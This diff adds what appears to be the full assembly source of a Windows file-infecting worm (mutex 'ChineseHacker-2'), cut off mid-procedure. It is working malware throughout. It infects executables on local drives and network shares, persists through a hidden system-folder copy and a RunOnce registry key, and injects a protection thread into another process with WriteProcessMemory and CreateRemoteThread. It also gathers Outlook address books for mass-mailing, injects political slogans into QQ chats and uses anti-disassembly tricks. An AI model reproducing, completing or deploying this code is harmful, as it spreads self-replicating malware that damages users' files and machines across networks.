@@ -1,0 +1,1799 @@
+include wap32.inc
+
+ApiAddressList struc
+  ;Kernel32.DLL
+  KnlLoadLibraryA          dd ?
+  KnlCreateMutexA          dd ?
+  KnlGetLastError          dd ?
+  KnlGetCommandLineA       dd ?
+  KnlWinExec               dd ?   
+  KnlGetDriveTypeA         dd ?
+  KnlSetCurrentDirectoryA  dd ?
+  KnlFindFirstFileA        dd ?
+  KnlFindNextFileA         dd ? 
+  KnlFindClose              dd ?
+  KnlSetFileAttributesA    dd ?
+  KnlSetFileTime           dd ? 
+  KnlLOpen                 dd ?
+  KnlLRead                 dd ?
+  KnlLWrite                dd ?
+  KnlLSeek                 dd ?
+  KnlLClose        dd ?  
+  KnlSleep         dd ?
+  KnlRegisterServiceProc   dd ?
+  KnlGetCurrentProcessId   dd ?
+  KnlOpenProcess       dd ?
+  KnlWriteProcessMemory    dd ?
+  KnlCreateRemoteThread    dd ?
+  KnlCreateKernelThread    dd ?
+  KnlCloseHandle       dd ?
+  KnlWaitForSingleObject   dd ?
+  KnlVirtualAllocEx    dd ?
+  KnlGetSystemDirectoryA   dd ?
+  KnlLCreat        dd ?
+  KnlCreateThread      dd ?
+  KnlTerminateThread       dd ?
+  KnlWideCharToMultiByte   dd ?
+  KnlGetComputerNameA      dd ?
+  KnlGetSystemTime     dd ?
+  ;User32.DLL
+  UserGetWinThreadProcId   dd ?
+  UserFindWindowA      dd ?
+  UserMessageBoxA      dd ?
+  UserGetWindow        dd ?
+  UserSendMessageA     dd ?
+  UserwsprintfA        dd ?
+  ;AdvApi32.DLL
+  AdvRegOpenKeyA       dd ?
+  AdvRegSetValueExA    dd ?
+  AdvRegQueryValueExA      dd ?
+  AdvRegNotifyChange       dd ?
+  ;Mpr.DLL
+  MprWNetOpenEnumA     dd ?
+  MprWNetEnumResourceA     dd ?
+  MprWNetCloseEnum         dd ?
+  ;WSock32.DLL
+  WsWSAStartup         dd ?
+  WsWSACleanup         dd ?
+  Wssend           dd ?
+  Wshtons          dd ?
+  Wsgethostbyname      dd ?
+  Wsconnect        dd ?
+  Wssocket         dd ?
+  Wsclosesocket        dd ?
+  Wsrecv           dd ?
+  ;VirusData        
+  DataKnlMzHeader      dd ? 
+  DataVirusSize        dd ?
+  DataRemoteThread     dd ?
+  
+
+ApiAddressList ends
+
+MAX_BUFF_SIZE=1000h
+VirusSize=offset VirusEnd-offset Start+10h
+
+extrn MessageBoxA: proc
+extrn ExitProcess: proc
+
+.586p
+.model flat,stdcall
+
+.data
+
+Start:
+    pushad
+    call    VirusEnd
+NeedDecode:
+    mov esi,[esp+4*8]
+    call    PushRunError    ;得到意外继续执行地址
+    popad
+    PushXXXCode db 68h  ;JmpOldApp
+    OldEntryRVA dd offset Exit
+    ret
+    db  0e9h        ;静态反汇编干扰
+
+PushRunError:
+    pop ecx
+    call    SetSehFrame
+FindKernel32:       
+    and esi,0fffff000h  ;得到Kernel.PELoader代码位置(不精确)
+LoopFindKernel32:
+    sub esi,1000h 
+    cmp word ptr[esi],'ZM'  ;搜索EXE文件头
+    jnz short LoopFindKernel32
+GetPeHeader:
+    movzx   edi,word ptr[esi.PEHeaderOffset]
+    add edi,esi 
+    mov ebp,[edi.fhExportsRVA]
+    add ebp,esi     ;得到输出函数表
+    mov ebx,[ebp.etExportNameList]
+    add ebx,esi     ;得到输出函数名表
+    xor eax,eax     ;函数序号计数
+    mov edx,esi     ;暂存Kernel32模块句柄
+LoopFindApiStr:
+    add ebx,04
+    inc eax     ;增加函数计数
+    mov edi,[ebx]
+    add edi,edx     ;得到一个Api函数名字符串
+    call    PushStrGetProcAddress
+    db  'GetProcAddress',0
+PushStrGetProcAddress:
+    pop esi     ;得到Api名字字符串
+    xor ecx,ecx
+    mov cl,15       ;GetProcAddress串大小
+    cld
+    rep cmpsb  
+    jnz short LoopFindApiStr  
+    mov esi,edx 
+    mov ebx,[ebp.etExportOrdlList]
+    add ebx,esi     ;取函数序号地址列表
+    movzx   ecx,word ptr[ebx+eax*2]
+    mov ebx,[ebp.etExportAddrList]
+    add ebx,esi     ;得到Kernel32函数地址列表
+    mov ebx,[ebx+ecx*4]
+    add ebx,esi     ;计算GetProcAddress函数地址
+
+    sub esp,size ApiAddressList+10h ;在堆栈中存放API的地址
+    mov edi,esp
+    
+    mov [esp.DataKnlMzHeader],esi
+
+    call    PushKnlApiStr   
+LoopRelocKnlApi:
+    mov ebp,ecx
+    call    ebx,esi
+    cld
+    stosd  
+    mov ecx,ebp     ;定位Kernel32.dll Api
+    loop    LoopRelocKnlApi
+
+    mov eax,[esp.KnlLoadLibraryA]
+    call    PushUser32Str
+    db  'USER32.DLL',0
+PushUser32Str:
+    call    eax
+    mov esi,eax 
+    call    PushUser32ApiStr
+LoopRelocUser32Api:
+    mov ebp,ecx
+    call    ebx,esi
+    cld
+    stosd  
+    mov ecx,ebp     ;定位User32.dll Api
+    loop    LoopRelocUser32Api
+    
+    mov eax,[esp.KnlLoadLibraryA]
+    call    PushAdvApi32Str
+    db  'ADVAPI32.DLL',0
+PushAdvApi32Str:
+    call    eax
+    mov esi,eax
+    call    PushAdvApiStr
+LoopRelocAdvApi32Api:
+    mov ebp,ecx
+    call    ebx,esi
+    cld
+    stosd  
+    mov ecx,ebp     ;定位ADVAPI32.dll Api
+    loop    LoopRelocAdvApi32Api
+
+    mov eax,[esp.KnlLoadLibraryA]
+    call    PushMprStr
+    db  'MPR.DLL',0
+PushMprStr:
+    call    eax
+    mov esi,eax
+    call    PushMprApiStr
+LoopRelocMprApi:
+    mov ebp,ecx
+    call    ebx,esi
+    cld
+    stosd  
+    mov ecx,ebp     ;定位MPR.dll Api
+    loop    LoopRelocMprApi
+
+    mov eax,[esp.KnlLoadLibraryA]
+    call    PushWsStr
+    db  'WSOCK32.DLL',0
+PushWsStr:
+    call    eax
+    mov esi,eax
+    call    PushWsApiStr
+LoopRelocWsApi:
+    mov ebp,ecx
+    call    ebx,esi
+    cld
+    stosd  
+    mov ecx,ebp     ;定位MPR.dll Api
+    loop    LoopRelocWsApi
+
+    mov esi,esp     ;函数调用列表指针,以后固定不变
+
+    call    PushMutexName
+    db  'ChineseHacker-2',0
+PushMutexName:  
+    call    [esi.KnlCreateMutexA],0,0
+    call    [esi.KnlGetLastError]
+    or  eax,eax     ;检查病毒是否已经运行
+    jz  short ExecOldProgram
+    int 3;      ;人工引发异常执行原程序,JmpOldApp
+    db  0e9h        ;静态反汇编干扰
+
+ExecOldProgram:         ;加载自己，运行老程序
+    call    [esi.KnlGetCommandLineA]
+    call    [esi.KnlWinExec],eax,L 01
+
+    call    PushNextRunErrorProc;保护注册表与创建远程线程
+    mov esi,esp     ;意外继续执行地址
+StartScan:  
+    call    PushScanErrorProc;搜索本地与远程目录文件
+    mov esi,esp     ;恢复函数调用列表指针
+    call    [esi.KnlSleep],1000*60;*10
+    jmp short StartScan ;休眠10分钟重新搜索文件
+    db  0e9h        ;静态反汇编干扰
+PushScanErrorProc:
+    pop ecx
+    call    SetSehFrame
+
+ScanExeFile:
+    call    GetFoundFileCallBackAddr
+    lea eax,[edx+offset OptExeFile-offset FoundFileCallBackAddr]    
+    mov [edx],eax   ;设置找到文件的处理程序
+
+    call    GetFoundDirCallBackAddr
+    lea eax,[edx+offset OptLocalDir-offset FoundDirCallBackAddr]
+    mov [edx],eax   ;设置找到目录的处理程序
+
+    call    EnumLogDrive    ;搜索本地文件，并传染病毒
+
+    call    GetFoundDirCallBackAddr
+    lea eax,[edx+offset OptNetDir-offset FoundDirCallBackAddr]
+    mov [edx],eax   ;设置找到NET目录的处理程序
+
+    call    EnumNetResource ;搜索远程文件，并传染病毒   
+
+ScanMailFile:
+    call    GetFoundFileCallBackAddr
+    lea eax,[edx+offset OptMailFile-offset FoundFileCallBackAddr]
+    mov [edx],eax   ;设置找到文件的处理程序
+
+    call    GetFoundDirCallBackAddr
+    lea eax,[edx+offset OptLocalDir-offset FoundDirCallBackAddr]
+    mov [edx],eax   ;设置找到目录的处理程序
+    call    EnumLogDrive    ;搜索本地文件，发邮件
+
+    call    GetFoundDirCallBackAddr
+    lea eax,[edx+offset OptNetDir-offset FoundDirCallBackAddr]
+    mov [edx],eax   ;设置找到NET目录的处理程序
+
+    call    EnumNetResource ;搜索远程文件，发邮件
+
+CheckRemoteAndWait:
+    mov eax,[esi.DataRemoteThread]
+    call    [esi.KnlWaitForSingleObject],eax,1000*60;
+    cmp eax,-1      ;睡眠8小时
+    jnz short AddWordToQQMsg
+NeedCreateRemote:
+    push    esi
+    call    PushWaitErrorProc
+    pop esi
+    call    GetNetSendMsg
+    db  'Net Send * My god! Some one killed ChineseHacker-2 Monitor',0
+GetNetSendMsg:
+    pop eax
+    call    [esi.KnlWinExec],eax,0
+    jmp short CheckRemoteAndWait
+PushWaitErrorProc:
+    pop ecx
+    call    SetSehFrame
+
+    call    ProcessProtect  ;重新启动远程线程保护/内带意外
+    db  0e9h        ;静态反汇编干扰
+
+AddWordToQQMsg: 
+    call    GetVirusBaseInRegEdi
+GetVirusBaseInRegEdi:
+    pop edi
+
+    mov eax,[esi.UserFindWindowA];填写线程用API
+    mov [edi+offset FindWindowA9x2k-offset GetVirusBaseInRegEdi],eax
+    mov eax,[esi.UserGetWindow]
+    mov [edi+offset GetWindow9x2k-offset GetVirusBaseInRegEdi],eax
+    mov eax,[esi.UserSendMessageA]
+    mov [edi+offset SendMessageA9x2k-offset GetVirusBaseInRegEdi],eax
+    mov eax,[esi.KnlSleep]
+    mov [edi+offset Sleep9x2k-offset GetVirusBaseInRegEdi],eax
+
+    lea eax,[edi+offset SendQQMsg-offset GetVirusBaseInRegEdi]
+    push    eax     ;创建QQ附加消息线程
+    call    [esi.KnlCreateThread],0,0,eax,eax,0,esp
+    mov ebx,eax     ;保证SendQQMsg线程活动10分钟
+    pop eax
+
+CheckRemoteAndWaitAgain:
+    mov eax,[esi.DataRemoteThread]
+    call    [esi.KnlWaitForSingleObject],eax,1000*60;
+    push    eax     ;睡眠10分钟
+    call    [esi.KnlTerminateThread],ebx,0
+    pop eax
+    cmp eax,-1
+    jz  short NeedCreateRemoteAgain
+    int 3;      ;人工意外，继续搜索文件
+    db  0e9h        ;静态反汇编干扰
+NeedCreateRemoteAgain:
+    push    esi
+    call    PushWaitErrorProcAgain
+    pop esi
+    jmp short CheckRemoteAndWaitAgain
+PushWaitErrorProcAgain:
+    pop ecx
+    call    SetSehFrame
+
+    call    ProcessProtect  ;重新启动远程线程保护/内带意外
+    db  0e9h        ;静态反汇编干扰
+
+PushNextRunErrorProc:       ;保护注册表与创建远程线程
+    pop ecx
+    call    SetSehFrame
+
+RegisterProtect:
+    sub esp,100h    ;构造病毒路径
+    call    BuildVirusPathInStack,esp
+    mov edi,esp
+    
+    call    [esi.KnlLCreat],edi,10h
+    cmp eax,-1h     ;创建独占文件
+    jz  short OptRegister
+    mov ebx,eax 
+    call    UnzipVirusToFile;解压PE文件
+    call    [esi.KnlLSeek],ebx,0,0
+    call    FixPeFile,ebx   ;传染病毒给PE文件,不关闭文件，防删除
+    mov edi,esp     ;把病毒设置为：隐藏+系统+只读
+    call    [esi.KnlSetFileAttributesA],edi,7h
+    
+OptRegister:    
+    push    eax
+    push    esp
+    call    PushRegKeyStr
+    db  'SOFTWARE\Microsoft\Windows\CurrentVersion\Run',0
+PushRegKeyStr:
+    call    [esi.AdvRegOpenKeyA],080000002h
+    pop ebx
+    mov eax,esp
+    call    PushKeyNameStr  ;修改注册表，自动Run项目
+    db  'Runonce',0
+PushKeyNameStr:
+    pop ecx
+    call    [esi.AdvRegSetValueExA],ebx,ecx,0,1,eax,100h
+
+    call    GetVirusBaseInEdi   
+GetVirusBaseInEdi:
+    pop edi     ;得到病毒位置参照偏移量
+
+    mov eax,[esi.AdvRegQueryValueExA];填写API地址
+    mov [edi+offset AdvRegQueryValueExA9x2k-offset GetVirusBaseInEdi],eax
+    mov eax,[esi.AdvRegSetValueExA]
+    mov [edi+offset AdvRegSetValueExA9x2k-offset GetVirusBaseInEdi],eax
+    mov eax,[esi.AdvRegNotifyChange]
+    mov [edi+offset AdvRegNotifyChangeKeyValue9x2k-offset GetVirusBaseInEdi],eax
+
+    lea eax,[edi+offset RegisterProtectProc-offset GetVirusBaseInEdi]       
+    push    eax     ;创建注册表监视线程
+    call    [esi.KnlCreateThread],0,0,eax,ebx,0,esp
+    pop eax     ;不关闭注册表句柄，监视线程续用
+
+ProcessProtect:         ;创建远程线程
+    xor eax,eax
+    mov [esi.DataRemoteThread],eax
+
+    sub esp,100h
+    call    BuildVirusPathInStack,esp
+
+    call    GetVirusBaseInEdiAgain
+GetVirusBaseInEdiAgain:
+    pop edi     ;得到病毒位置参照偏移量
+
+    mov eax,[esi.KnlOpenProcess];填写API地址
+    mov [edi+offset KnlOpenProcess9x2k-offset GetVirusBaseInEdiAgain],eax
+    mov eax,[esi.KnlWaitForSingleObject]
+    mov [edi+offset KnlWaitForSingleObject9x2k-offset GetVirusBaseInEdiAgain],eax
+    mov eax,[esi.KnlWinExec]
+    mov [edi+offset KnlWinExec9x2k-offset GetVirusBaseInEdiAgain],eax   
+
+    mov eax,[esi.KnlRegisterServiceProc]
+    or  eax,eax     ;依靠函数RehSvrProc来假定操作系统类别9x/2k
+    jz  short Process2kProtect  
+
+Process9xProtect:
+    call    eax,L 0,L 1 ;在Win9x下先隐藏本进程，一级保护
+
+    mov edx,[esi.DataKnlMzHeader]
+    movzx   ebx,word ptr[edx.PEHeaderOffset]
+    add ebx,edx
+    mov ecx,[ebx.fhObjectTable00.otRVA]
+    mov ebp,[ebx.fhHeaderSize]
+    sub ecx,ebp
+    cmp ecx,200h
+    jb  short Process9xProtectEnd
+    add ebp,edx     ;查询Knl空间
+
+    lea edx,[edi+offset ProcessProtectProc-offset GetVirusBaseInEdiAgain]   
+    call    MoveDataToKnl,edx,ebp,ProcessProtectProcSize
+    lea ecx,[ebp+ProcessProtectProcSize]
+    mov edx,esp     ;复制线程代码数据到Kernel32.dll
+    call    MoveDataToKnl,edx,ecx,100h
+
+    call    [esi.KnlGetCurrentProcessId]
+    push    eax     ;创建Kernel线程，未公开函数
+    call    [esi.KnlCreateKernelThread],0,0,ebp,eax,0,esp
+    mov [esi.DataRemoteThread],eax
+    pop eax     ;启动进程保护线程
+    
+    call    [esi.KnlSleep],500
+
+Process9xProtectEnd:
+    int 3       ;人工异常
+    db  0e9h        ;反汇编干扰 
+
+Process2kProtect:       ;填写API地址
+    call    [esi.UserFindWindowA],0,0
+    push    eax     ;找Explorer进程/或者Top窗口程序
+    call    [esi.UserGetWinThreadProcId],eax,esp   
+    call    [esi.KnlOpenProcess],PROCESS_ALL_ACCESS,0
+    or  eax,eax     ;打开该进程
+    jz  short Process2kProtectEnd
+    mov ebx,eax
+    call    [esi.KnlVirtualAllocEx],ebx,NULL,200h,MEM_COMMIT,L 40h
+    or  eax,eax
+    jz  short Close2kHandle
+    mov ebp,eax     ;分配远程空间
+
+    lea edx,[edi+offset ProcessProtectProc-offset GetVirusBaseInEdiAgain]
+    push    eax
+    call    [esi.KnlWriteProcessMemory],ebx,ebp,edx,ProcessProtectProcSize,esp
+    pop eax     ;复制代码到远程地址空间
+    cmp eax,ProcessProtectProcSize
+    jnz short Close2kHandle
+        
+    mov edx,esp
+    lea ecx,[ebp+ProcessProtectProcSize]
+    push    eax
+    call    [esi.KnlWriteProcessMemory],ebx,ecx,edx,100h,esp
+    call    [esi.KnlGetCurrentProcessId]
+    call    [esi.KnlCreateRemoteThread],ebx,NULL,NULL,ebp,eax,NULL,esp
+    mov [esi.DataRemoteThread],eax
+    pop eax     ;启动进程保护线程   
+
+Close2kHandle:
+    call    [esi.KnlCloseHandle],ebx
+    call    [esi.KnlSleep],500
+
+Process2kProtectEnd:
+    int 3       ;人工异常
+    db  0e9h        ;反汇编干扰
+    
+PushKnlApiStr:  ;:ecx=函数名个数    
+    pop eax     ;弹出返回地址
+    mov ecx,esp
+    call    PushKnlApiStr33
+    db  'GetSystemTime',0
+PushKnlApiStr33:
+    call    PushKnlApiStr32
+    db  'GetComputerNameA',0
+PushKnlApiStr32:
+    call    PushKnlApiStr31
+    db  'WideCharToMultiByte',0
+PushKnlApiStr31:
+    call    PushKnlApiStr30
+    db  'TerminateThread',0
+PushKnlApiStr30:
+    call    PushKnlApiStr29
+    db  'CreateThread',0
+PushKnlApiStr29:
+    call    PushKnlApiStr28
+    db  '_lcreat',0
+PushKnlApiStr28:
+    call    PushKnlApiStr27
+    db  'GetSystemDirectoryA',0
+PushKnlApiStr27:
+    call    PushKnlApiStr26
+    db  'VirtualAllocEx',0
+PushKnlApiStr26:
+    call    PushKnlApiStr25
+    db  'WaitForSingleObject',0
+PushKnlApiStr25:
+    call    PushKnlApiStr24
+    db  'CloseHandle',0
+PushKnlApiStr24:
+    call    PushKnlApiStr23
+    db  'CreateKernelThread',0
+PushKnlApiStr23:
+    call    PushKnlApiStr22
+    db  'CreateRemoteThread',0
+PushKnlApiStr22:
+    call    PushKnlApiStr21
+    db  'WriteProcessMemory',0
+PushKnlApiStr21:
+
+    call    PushKnlApiStr20
+    db  'OpenProcess',0
+PushKnlApiStr20:
+    call    PushKnlApiStr19
+    db  'GetCurrentProcessId',0
+PushKnlApiStr19:
+    call    PushKnlApiStr18
+    db  'RegisterServiceProcess',0
+PushKnlApiStr18:    
+    call    PushKnlApiStr17
+    db  'Sleep',0
+PushKnlApiStr17:    
+    call    PushKnlApiStr16
+    db  '_lclose',0
+PushKnlApiStr16:  
+    call    PushKnlApiStr15
+    db  '_llseek',0
+PushKnlApiStr15:  
+    call    PushKnlApiStr14
+    db  '_lwrite',0
+PushKnlApiStr14:  
+    call    PushKnlApiStr13
+    db  '_lread',0
+PushKnlApiStr13:  
+    call    PushKnlApiStr12
+    db  '_lopen',0
+PushKnlApiStr12:
+    call    PushKnlApiStr11
+    db  'SetFileTime',0
+PushKnlApiStr11:
+    call  PushKnlApiStr10
+    db  'SetFileAttributesA',0
+PushKnlApiStr10:
+    call    PushKnlApiStr09
+    db  'FindClose',0
+PushKnlApiStr09:
+    call    PushKnlApiStr08
+    db  'FindNextFileA',0
+PushKnlApiStr08:
+    call    PushKnlApiStr07
+    db  'FindFirstFileA',0
+PushKnlApiStr07:
+    call    PushKnlApiStr06
+    db  'SetCurrentDirectoryA',0
+PushKnlApiStr06:
+    call    PushKnlApiStr05
+    db  'GetDriveTypeA',0
+PushKnlApiStr05:
+    call    PushKnlApiStr04
+    db  'WinExec',0
+PushKnlApiStr04:
+    call    PushKnlApiStr03
+    db  'GetCommandLineA',0
+PushKnlApiStr03:
+    call    PushKnlApiStr02
+    db  'GetLastError',0
+PushKnlApiStr02:
+    call    PushKnlApiStr01
+    db  'CreateMutexA',0
+PushKnlApiStr01:
+    call    PushKnlApiStr00
+    db  'LoadLibraryA',0
+PushKnlApiStr00:
+    sub ecx,esp
+    shr ecx,2
+    jmp eax
+    db  0e9h        ;静态反汇编干扰
+
+PushUser32ApiStr:
+    pop eax
+    mov ecx,esp
+    call    PushUser32ApiStr05
+    db  'wsprintfA',0
+PushUser32ApiStr05:   
+    call    PushUser32ApiStr04
+    db  'SendMessageA',0
+PushUser32ApiStr04:   
+    call    PushUser32ApiStr03
+    db  'GetWindow',0
+PushUser32ApiStr03:   
+    call    PushUser32ApiStr02
+    db  'MessageBoxA',0
+PushUser32ApiStr02:   
+    call    PushUser32ApiStr01
+    db  'FindWindowA',0
+PushUser32ApiStr01:   
+    call  PushUser32ApiStr00
+    db  'GetWindowThreadProcessId',0
+PushUser32ApiStr00:
+    sub ecx,esp
+    shr ecx,2
+    jmp eax
+    db  0e9h        ;静态反汇编干扰
+PushAdvApiStr:
+    pop eax
+    mov ecx,esp
+    call    PushAdvApi03
+    db  'RegNotifyChangeKeyValue',0
+PushAdvApi03:
+    call    PushAdvApi02
+    db  'RegQueryValueExA',0
+PushAdvApi02:
+    call    PushAdvApi01
+    db  'RegSetValueExA',0
+PushAdvApi01:
+    call    PushAdvApi00
+    db  'RegOpenKeyA',0
+PushAdvApi00:
+    sub ecx,esp
+    shr ecx,2
+    jmp eax
+    db  0e9h        ;静态反汇编干扰
+
+PushMprApiStr:
+    pop eax
+    mov ecx,esp
+    call    PushMprAPiStr02
+    db  'WNetCloseEnum',0
+PushMprAPiStr02:
+    call    PushMprApiStr01
+    db  'WNetEnumResourceA',0
+PushMprApiStr01:   
+    call  PushMprApiStr00
+    db  'WNetOpenEnumA',0
+PushMprApiStr00:
+    sub ecx,esp
+    shr ecx,2
+    jmp eax
+    db  0e9h        ;静态反汇编干扰
+
+PushWsApiStr:
+    pop eax
+    mov ecx,esp
+    call    PushWsApiStr08
+    db  'recv',0
+PushWsApiStr08:
+    call    PushWsApiStr07
+    db  'closesocket',0
+PushWsApiStr07:
+    call    PushWsApiStr06
+    db  'socket',0
+PushWsApiStr06:
+    call    PushWsApiStr05
+    db  'connect',0
+PushWsApiStr05:
+    call    PushWsApiStr04
+    db  'gethostbyname',0
+PushWsApiStr04:
+    call    PushWsApiStr03
+    db  'htons',0
+PushWsApiStr03:
+    call    PushWsApiStr02
+    db  'send',0
+PushWsApiStr02:
+    call    PushWsApiStr01
+    db  'WSACleanup',0
+PushWsApiStr01:
+    call    PushWsApiStr00
+    db  'WSAStartup',0
+PushWsApiStr00:
+    sub ecx,esp
+    shr ecx,2
+    jmp eax
+    db  0e9h        ;静态反汇编干扰
+
+PushQQMsg:
+    pop eax
+    mov ecx,esp 
+    call    PushQQMsg00
+    db  '枪毙李洪志!',0
+PushQQMsg00:
+    call    PushQQMsg01
+    db  '去他妈的法轮功!',0
+PushQQMsg01:
+    call    PushQQMsg02
+    db  '反对邪教,崇尚科学!',0
+PushQQMsg02:
+    call    PushQQMsg03
+    db  '打倒本拉登!',0
+PushQQMsg03:
+    call    PushQQMsg04
+    db  '向英雄王伟致意!',0
+PushQQMsg04:
+    call    PushQQMsg05
+    db  '反对霸权主义!',0
+PushQQMsg05:
+    call    PushQQMsg06
+    db  '世界需要和平!',0
+PushQQMsg06:
+    call    PushQQMsg07
+    db  '社会主义好!',0
+PushQQMsg07:
+    sub ecx,esp 
+    jmp eax
+    db  0e9h        ;静态反汇编干扰
+
+BuildVirusPathInStack proc Stack: dword
+    pushad
+    mov edi,Stack
+    call    [esi.KnlGetSystemDirectoryA],edi,100h
+    add edi,eax
+    call    GetVirusFileName
+    db  '\runouce.exe',0
+GetVirusFileName:
+    pop esi
+    mov ecx,16
+    cld
+    rep movsb       ;合成病毒路径名
+    popad
+    ret
+BuildVirusPathInStack endp
+    db  0e9h        ;静态反汇编干扰
+
+EnumLogDrive proc
+    ;列举本地逻辑磁盘文件
+    mov ecx,24
+    mov edx,'\:C'
+ContEnumLogDrive:
+    push    ecx
+    push    edx
+    call    [esi.KnlGetDriveTypeA],esp
+    cmp eax,2       ;是不可访问磁盘
+    jb  short ContNextLogDrive
+    cmp eax,5       ;是CDROM光盘
+    jz  short ContNextLogDrive
+    call    EnumFileObject,esp  
+ContNextLogDrive:
+    pop edx
+    inc edx
+    pop ecx
+    loop    short ContEnumLogDrive
+    ret
+EnumLogDrive endp
+    db  0e9h        ;静态反汇编干扰
+
+EnumNetResource proc
+    ;列举网络资源
+    xor edi,edi ;edi: NetData
+    call    PushEnumNetWorkGroup
+    call    PushEnumNetComputer
+    call    PushEnumNetComputerShareDir
+    call    PushEnumNetFile  
+    mov eax,[edi.lpRemoteName]
+    call    EnumFileObject,eax;列举计算机共享目录里的文件
+    ret
+    db  0e9h        ;静态反汇编干扰
+PushEnumNetFile:        ;列举计算机共享目录
+    call    EnumNetObject,RESOURCEUSAGE_CONNECTABLE,edi
+    ret
+    db  0e9h        ;静态反汇编干扰
+PushEnumNetComputerShareDir:    ;列举计算机
+    call    EnumNetObject,RESOURCEUSAGE_CONTAINER,edi
+    ret
+    db  0e9h        ;静态反汇编干扰
+PushEnumNetComputer:        ;列举工作组
+    call    EnumNetObject,RESOURCEUSAGE_CONTAINER,edi
+    ret
+    db  0e9h        ;静态反汇编干扰
+PushEnumNetWorkGroup:       ;列举网络根
+    call    EnumNetObject,RESOURCEUSAGE_CONTAINER,edi
+    ret
+    db  0e9h        ;静态反汇编干扰
+EnumNetResource endp
+
+EnumNetObject proc Flag:dword,NetData:dword,CallBack:dword  
+    ;用来列举局域网某种对象
+    pushad
+    push    eax
+    call    [esi.MprWNetOpenEnumA],RESOURCE_GLOBALNET,RESOURCETYPE_DISK,Flag,NetData,esp   
+    pop ebx     ;弹出hEnum句柄,平衡堆栈
+    or  eax,eax
+    jnz short EnumNetObjectError
+    sub esp,MAX_BUFF_SIZE;划分堆栈空间大小
+LoopEnumNetObject:
+    mov edx,esp
+    push    L 1h        ;一次列举一个
+    mov eax,esp 
+    push    MAX_BUFF_SIZE   ;缓冲区大小
+    call    [esi.MprWNetEnumResourceA],ebx,eax,edx,esp
+    pop ecx
+    pop ecx     ;平衡堆栈
+    or  eax,eax
+    jnz short EnumNetObjectOver
+    mov edi,esp
+    call    CallBack    ;调用回调函数,利用edi,传递参数
+    jmp short LoopEnumNetObject
+    db  0e9h        ;静态反汇编干扰
+EnumNetObjectOver:
+    call    [esi.MprWNetCloseEnum],ebx
+    add esp,MAX_BUFF_SIZE
+EnumNetObjectError:
+    popad
+    ret
+EnumNetObject endp
+    db  0e9h        ;静态反汇编干扰
+
+EnumFileObject proc BootDir:dword
+    ;用来列举目录/网络上某个共享目录   
+    pushad
+    mov eax,BootDir
+    mov eax,[eax]
+    or  eax,20202020h
+    cmp eax,'nniw'  ;不感染WINN...目录
+    jz  short SetDirError
+    cmp eax,'dniw'  ;不感染WIND...目录
+    jz  short SetDirError
+    call    [esi.KnlSetCurrentDirectoryA],BootDir ;设为当前目录
+    or  eax,eax
+    jz  short SetDirError
+    call    FoundDirObject,BootDir
+    sub esp,MAX_BUFF_SIZE;1000h字节的缓冲区
+    mov [esp],L 2a2e2ah ;建立"*.*"字符串
+    mov eax,esp
+    call    [esi.KnlFindFirstFileA],eax,esp
+    mov ebx,eax
+    cmp eax,-1
+    jz  short EnumFileObjectError     
+LoopEnumFileObject:
+    call    [esi.KnlFindNextFileA],ebx,esp
+    or  eax,eax
+    jz  short EnumFileObjectOver
+    lea edx,[esp.cFileName]
+    mov eax,[esp.dwFileAttributes]
+    and eax,10h     ;测试文件属性
+    jz  short IsFileObject
+IsDirObject:            ;是一个目录
+    mov eax,[edx]
+    cmp al,'.'      ;测试是否点目录,是就不处理
+    jz  short LoopEnumFileObject
+    call    EnumFileObject,edx;递归调用
+    jmp short LoopEnumFileObject
+    db  0e9h        ;静态反汇编干扰
+IsFileObject:           ;是一个文件
+    call    FoundFileObject,esp;操作文件
+    jmp short LoopEnumFileObject
+    db  0e9h        ;静态反汇编干扰
+EnumFileObjectOver:    
+    call    [esi.KnlFindClose],ebx
+EnumFileObjectError:
+    mov dword ptr[esp],L 2e2eh  ;恢复原来的当前目录 建立字符串".."
+    call    [esi.KnlSetCurrentDirectoryA],esp
+    add esp,MAX_BUFF_SIZE;平衡堆栈
+SetDirError:
+    popad
+    ret
+EnumFileObject endp
+    db  0e9h        ;静态反汇编干扰
+
+FoundDirObject proc DirName: dword
+    pushad
+    call    PushOptDirError
+    popad
+    ret
+    db  0e9h        ;静态反汇编干扰
+PushOptDirError:
+    pop ecx     ;意外忽略设置
+    call    SetSehFrame
+    call    GetFoundDirCallBackAddr
+    call    [edx],DirName
+    int 3       ;人工意外
+FoundDirObject endp
+    db  0e9h        ;静 
+
+FoundFileObject proc FindData:dword     
+    pushad
+    call    PushOptFileError
+    popad
+    ret
+    db  0e9h        ;静态反汇编干扰
+
+PushOptFileError:
+    pop ecx     ;意外忽略设置
+    call    SetSehFrame
+    call    GetFoundFileCallBackAddr
+    call    [edx],FindData
+    int 3       ;人工意外
+FoundFileObject endp
+    db  0e9h        ;静态反汇编干扰
+
+GetFoundDirCallBackAddr:
+    call    PushFoundDirCallBackAddr
+    FoundDirCallBackAddr dd ?
+PushFoundDirCallBackAddr:
+    pop edx
+    ret
+    db  0e9h        ;静态反汇编干扰
+
+GetFoundFileCallBackAddr:
+    call    PushFoundFileCallBackAddr
+    FoundFileCallBackAddr dd ?
+PushFoundFileCallBackAddr:
+    pop edx
+    ret
+    db  0e9h        ;静态反汇编干扰
+
+GetFileExtName proc FileName: dword
+    mov eax,FileName
+ContIncEax:
+    inc eax
+    cmp byte ptr[eax],0
+    jnz short ContIncEax
+    mov eax,[eax-4]
+    or  eax,20202020h
+    ret
+GetFileExtName endp
+    db  0e9h        ;静态反汇编干扰
+
+OptLocalDir proc DirName: dword 
+    call    [esi.KnlSleep],10;消除CPU时间占有异常
+    ret
+OptLocalDir endp
+    db  0e9h        ;静态反汇编干扰
+
+OptNetDir proc NetDirName: dword    
+    sub esp,100h
+    call    BuildVirusPathInStack,esp
+    mov edi,esp
+    call    [esi.KnlLOpen],edi,0
+    cmp eax,-1
+    jz  short OptNetDirEnd
+    mov ebx,eax
+    mov eax,100h
+    push    eax
+    mov eax,esp
+    call    [esi.KnlGetComputerNameA],edi,eax
+    pop eax
+    add eax,edi
+    mov dword ptr[eax],'lme.'
+    mov dword ptr[eax+4],0
+    call    [esi.KnlLCreat],edi,0
+    cmp eax,-1
+    jz  short CloseVirFile
+    mov edi,eax
+    call    MakeMailFile,0,ebx,edi
+    call    [esi.KnlLClose],edi
+CloseVirFile:
+    call    [esi.KnlLClose],ebx
+OptNetDirEnd:
+    add esp,100h
+    ret
+OptNetDir endp
+    db  0e9h        ;静态反汇编干扰
+
+OptMailFile proc FindData: dword    
+    mov edi,FindData
+    lea ebx,[edi.cFileName]
+    call    GetFileExtName,ebx
+    cmp eax,'baw.'  ;得到OutLook地址薄文件
